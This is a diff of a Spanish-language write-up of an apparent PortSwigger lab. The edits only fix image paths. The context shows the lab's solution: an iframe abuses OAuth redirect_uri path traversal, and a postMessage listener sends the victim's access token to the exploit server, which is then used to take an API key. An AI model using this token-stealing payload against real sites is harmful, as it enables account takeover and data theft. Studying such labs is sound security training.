@@ -9,7 +9,7 @@ Este ejercicio demuestra cómo una combinación de path traversal, comportamient
 Solucion
 Vamos a crear un script en nuestro exploit server
 para hacer el iframe hay que inteceptar despues de deslogearnos y en el apartado de carga es ahi donde interceptamos vamos a poner el host y la parte de arriba y vamos a poner despues del callback el (/../post/comment/comment-form)
-![Pasted_image_20250830193959.png](Imagenes/Pasted_image_20250830193959.png)
+![Pasted_image_20250830193959.png](/Imagenes/Pasted_image_20250830193959.png)
 <'iframe src="https://oauth-0aab00270358900a80603d6d028500d5.oauth-server.net/auth?client_id=g2x5o5192ufzif2j33ser&redirect_uri=https://0ad9005203d590bb80333f79006900eb.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=1641080511&scope=openid%20profile%20email"></iframe'>
 
 <script>
@@ -17,12 +17,12 @@ para hacer el iframe hay que inteceptar despues de deslogearnos y en el apartado
         fetch("/" + encodeURIComponent(e.data.data))
     }, false)
 </script>
-![Pasted_image_20250830194353.png](Imagenes/Pasted_image_20250830194353.png)
+![Pasted_image_20250830194353.png](/Imagenes/Pasted_image_20250830194353.png)
  le damos store enviamos a la victima y miramos los acces log recargando y vemos el access token 
-![Pasted_image_20250830194512.png](Imagenes/Pasted_image_20250830194512.png)
+![Pasted_image_20250830194512.png](/Imagenes/Pasted_image_20250830194512.png)
 lo pegamos en el authorization y le damos send
-![Pasted_image_20250830194554.png](Imagenes/Pasted_image_20250830194554.png)
+![Pasted_image_20250830194554.png](/Imagenes/Pasted_image_20250830194554.png)
 y ya solo copiamos la api key y pegamos en la pagina
-![Pasted_image_20250830194626.png](Imagenes/Pasted_image_20250830194626.png)
+![Pasted_image_20250830194626.png](/Imagenes/Pasted_image_20250830194626.png)
 
  
